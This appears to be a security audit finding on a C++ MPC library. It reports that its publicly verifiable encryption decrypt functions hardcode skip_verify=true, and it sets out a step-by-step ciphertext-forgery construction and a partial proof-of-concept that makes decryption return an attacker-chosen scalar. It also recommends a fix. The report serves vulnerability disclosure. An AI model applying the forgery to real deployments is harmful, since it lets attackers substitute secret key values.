### Title
`pve::decrypt()` Unconditionally Skips ZK Proof Verification, Enabling Ciphertext Substitution to Output Attacker-Chosen Scalar — (`src/cbmpc/api/pve_base_pke.cpp`, `src/cbmpc/protocol/pve.cpp`)

---

### Summary

The public API function `pve::decrypt()` hardcodes `skip_verify=true` when calling `ec_pve_t::decrypt()`, permanently bypassing the ZK proof check in `ec_pve_t::verify()`. The only remaining guard — `x_value * G != Q` in `restore_from_decrypted()` — is trivially satisfiable by an attacker because `Q` is read directly from the attacker-controlled ciphertext blob. An attacker who can supply a crafted ciphertext can cause the decryptor to output an arbitrary scalar `x_target` of their choice.

---

### Finding Description

**Confirmed call chain:**

`pve::decrypt()` in `src/cbmpc/api/pve_base_pke.cpp` at line 278 calls:

```cpp
rv = pve_ct.decrypt(bridge, pve_keyref(dk_mem), pve_keyref(ek_mem), label, icurve, x_bn,
                    /*skip_verify=*/true);
``` [1](#0-0) 

Inside `ec_pve_t::decrypt()`, the guard is:

```cpp
if (!skip_verify && (rv = verify(base_pke, ek, Q, label))) return rv;
``` [2](#0-1) 

With `skip_verify=true`, `ec_pve_t::verify()` — which re-derives `b'` from a hash of all commitments and checks `b' == b` — is never called. The only remaining check is in `restore_from_decrypted()`:

```cpp
MODULO(q) x_value = x_bi_bar + x_bi;
if (x_value * G != Q) { x_value = 0; return coinbase::error(E_CRYPTO); }
``` [3](#0-2) 

`Q` here is the `Q` field deserialized from the attacker-supplied ciphertext blob — it is not an externally-supplied expected value. The `inner_label` used for decryption is also derived from this attacker-controlled `Q`:

```cpp
buf_t inner_label = genPVELabelWithPoint(label, Q);
``` [4](#0-3) 

where `genPVELabelWithPoint` is:

```cpp
return buf_t(label) + "-" + strext::to_hex(crypto::sha256_t::hash(Q));
``` [5](#0-4) 

**Concrete forgery construction:**

1. Attacker picks target scalar `x_target`.
2. Sets `Q = x_target * G` in the forged `ec_pve_t` blob.
3. Computes `inner_label = genPVELabelWithPoint(label, Q)` — fully computable since `label` is public and `Q` is chosen.
4. Picks any `x_bi` in `[0, q)`, computes `x_bi_bar = x_target - x_bi mod q`.
5. Encrypts `x_bi_bar` under the legitimate `ek` with `inner_label` → produces valid `c[i]`.
6. Sets `x_rows[i] = x_bi`, sets bit `i` of `b` to `1` (so `restore_from_decrypted` takes the `bi=1` branch and reads `x_bi` from `x_rows[i]`).
7. Sets all other rows to garbage (they will fail `base_pke.decrypt` or the `Q` check and be skipped).

**Execution path through `restore_from_decrypted()`:**

- `bi = b.get_bit(i) = 1` → `x_bi = x_rows[i]` (attacker-set)
- `base_pke.decrypt(dk, inner_label, c[i], x_buf)` → returns `x_bi_bar` (attacker-crafted, decrypts correctly under `dk` because it was encrypted under `ek` with the matching `inner_label`)
- `x_value = x_bi_bar + x_bi = x_target mod q`
- `x_value * G = x_target * G = Q` ✓ — check passes
- Returns `x_target` [6](#0-5) 

The same pattern applies to `decrypt_batch()` in `pve_batch_single_recipient.cpp`, which also hardcodes `skip_verify=true`: [7](#0-6) 

and to `combine_ac()` in `pve_batch_ac.cpp`: [8](#0-7) 

---

### Impact Explanation

An attacker who controls the ciphertext blob passed to `pve::decrypt()` (or `decrypt_batch()` / `combine_ac()`) can cause the decryptor to output an arbitrary scalar `x_target` instead of the original `x`. Because `Q` is read from the ciphertext and never compared against an externally-trusted expected value, the `x_value * G == Q` check provides no security — it is a self-referential consistency check that the attacker trivially satisfies by setting `Q = x_target * G`. The ZK proof in `verify()` is the only mechanism that would bind `Q` to an honestly-produced ciphertext, and it is unconditionally skipped.

---

### Likelihood Explanation

The attack requires only:
- The ability to supply a crafted ciphertext to `pve::decrypt()` (malicious transport peer, Byzantine participant, or any caller-controlled input path).
- Knowledge of `ek` (public) and `label` (public or derivable from context).
- No knowledge of `dk` or the original `x`.

The `pve::verify()` function exists and would prevent this if called first, but `pve::decrypt()` does not call it and the public API imposes no requirement to do so. The `skip_verify=true` flag is hardcoded at the API layer with no opt-in verification path in `decrypt`.

---

### Recommendation

Remove the `skip_verify=true` override in `pve::decrypt()`, `decrypt_batch()`, and `combine_ac()`. If performance is a concern for the decrypt path, require callers to pass the expected `Q` (or `Qs`) as a parameter to `decrypt`, and perform the `Q`-binding check against that externally-trusted value rather than the value embedded in the ciphertext. Alternatively, document and enforce at the API boundary that `verify()` must be called before `decrypt()`, and add an assertion or state flag to detect violations.

---

### Proof of Concept

```cpp
// Setup: legitimate keypair and label
buf_t ek, dk;
generate_base_pke_rsa_keypair(ek, dk);
mem_t label = mem_t("test-label");
ecurve_t curve = curve_secp256k1;
const mod_t& q = curve.order();
const auto& G = curve.generator();

// Attacker's target scalar
bn_t x_target = bn_t::from_hex("deadbeef...");  // any value

// Attacker builds forged ec_pve_t
ec_pve_t forged;
// Set Q = x_target * G
ecc_point_t Q_forged = x_target * G;
// Compute inner_label from forged Q
buf_t inner_label = genPVELabelWithPoint(label, Q_forged);

// Pick x_bi, compute x_bi_bar
bn_t x_bi = bn_t(42);
bn_t x_bi_bar;
MODULO(q) x_bi_bar = x_target - x_bi;

// Encrypt x_bi_bar under ek with inner_label → c[0]
buf_t c0;
base_pke_bridge_t bridge(base_pke_default());
bridge.encrypt(pve_keyref(ek_mem), inner_label, x_bi_bar.to_bin(), rho, c0);

// Forge the ec_pve_t fields: Q=Q_forged, b with bit 0 set, x_rows[0]=x_bi, c[0]=c0
// ... (serialize forged ec_pve_t into pve_ciphertext_blob_v1_t)

// Call public API decrypt
buf_t out_x;
error_t rv = pve::decrypt(curve_id::secp256k1, dk, ek, forged_ciphertext, label, out_x);
// rv == SUCCESS, out_x == x_target.to_bin()
// Assert: out_x != original_x (substitution succeeded)
assert(bn_t::from_bin(out_x) == x_target);
```

### Citations

**File:** src/cbmpc/api/pve_base_pke.cpp (L277-279)
```cpp
  coinbase::crypto::bn_t x_bn;
  rv = pve_ct.decrypt(bridge, coinbase::mpc::pve_keyref(dk_mem), coinbase::mpc::pve_keyref(ek_mem), label, icurve, x_bn,
                      /*skip_verify=*/true);
```

**File:** src/cbmpc/protocol/pve.cpp (L118-145)
```cpp
error_t ec_pve_t::restore_from_decrypted(int row_index, mem_t decrypted_x_buf, ecurve_t curve, bn_t& x_value) const {
  const mod_t& q = curve.order();
  const auto& G = curve.generator();
  const int max_scalar_size = q.get_bin_size();

  bool bi = b.get_bit(row_index);
  if (decrypted_x_buf.size > max_scalar_size) return coinbase::error(E_CRYPTO);
  bn_t x_bi_bar = bn_t::from_bin(decrypted_x_buf);
  if (!q.is_in_range(x_bi_bar)) return coinbase::error(E_CRYPTO);

  bn_t x_bi;
  if (bi) {
    if (x_rows[row_index].get_bin_size() > max_scalar_size) return coinbase::error(E_CRYPTO);
    if (!q.is_in_range(x_rows[row_index])) return coinbase::error(E_CRYPTO);
    x_bi = x_rows[row_index];
  } else {
    crypto::drbg_aes_ctr_t drbg0(r[row_index]);
    x_bi = drbg0.gen_bn(q);
  }

  MODULO(q) x_value = x_bi_bar + x_bi;

  if (x_value * G != Q) {
    x_value = 0;
    return coinbase::error(E_CRYPTO);
  }
  return SUCCESS;
}
```

**File:** src/cbmpc/protocol/pve.cpp (L150-150)
```cpp
  if (!skip_verify && (rv = verify(base_pke, ek, Q, label))) return rv;
```

**File:** src/cbmpc/protocol/pve.cpp (L152-152)
```cpp
  buf_t inner_label = genPVELabelWithPoint(label, Q);
```

**File:** src/cbmpc/api/pve_batch_single_recipient.cpp (L173-174)
```cpp
  rv = pve_ct.decrypt(bridge, coinbase::mpc::pve_keyref(dk_mem), coinbase::mpc::pve_keyref(ek_mem), label, icurve,
                      xs_bn, /*skip_verify=*/true);
```

**File:** src/cbmpc/api/pve_batch_ac.cpp (L354-355)
```cpp
  rv = pve_ct.aggregate_to_restore_row(bridge, ac_internal, attempt_index, label, quorum_bn, xs_bn,
                                       /*skip_verify=*/true, pk_ptrs);
```
